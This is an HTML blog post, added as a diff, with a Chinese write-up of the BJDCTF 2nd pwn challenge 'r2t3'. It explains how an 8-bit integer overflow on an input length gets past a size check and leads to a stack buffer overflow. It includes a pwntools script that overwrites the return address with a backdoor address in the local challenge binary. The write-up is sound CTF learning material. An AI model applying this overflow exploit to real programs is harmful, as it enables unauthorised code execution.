@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BJDCTF 2nd Pwn R2t3 | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BJDCTF 2nd Pwn R2t3</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/03/23</h2>
+</div>
+
+<main>
+<h1 id="bjdctf-2nd-pwn-r2t3">BJDCTF 2nd Pwn R2t3</h1>
+<p>考点：短整数溢出，参考XCTF中的int_overflow</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324000627748.png" alt="image-20200324000627748"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324000728896.png" alt="image-20200324000728896"></p>
+<p>可以读入0x400进入buf，要满足条件3&lt;v3&lt;=8才能绕过判断执行strcpy，可以发现dest的栈只有0x11，所以这里存在栈溢出，可以发现v3是无符号整形的数据，__int8意味着只能存8位的数字转换成十进制就是0~255这256个字节超出部分就截断了，但是read却可以读0x400进去所以可以利用整形溢出来bypass这个if</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324174335835.png" alt="image-20200324174335835"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324174711217.png" alt="image-20200324174711217"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324174730058.png" alt="image-20200324174730058"></p>
+<p>256的2进制串后8位为0000 0000表示10进制数为0，如果通过strlen(s)返回的字节数是256那么v3实际上就表示0</p>
+<p>同理257表示1，258=256+2表示2，259=256+3表示3，所以要满足3&lt;v3&lt;8,，就是256+4=260 &lt; s &lt;264=256+8</p>
+<p>本题选择入读262个字符</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>
+sh <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./r2t3</span><span style="color:#e6db74">&#39;</span>)
+
+backdoor_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804858b</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">21</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(backdoor_addr)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">262</span><span style="color:#f92672">-</span>len(payload))
+
+sh<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">name:</span><span style="color:#e6db74">&#39;</span>,payload)
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324194959283.png" alt="image-20200324194959283"></p>
+<p>问题：</p>
+<p>读入0x400可以打本地(kali2020.1-glibc-2.29)和buuctf，但是读262字节只能打buu不能打本地，换成ubuntu19.04-glibc-2.29之后读入262可以打本地了</p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
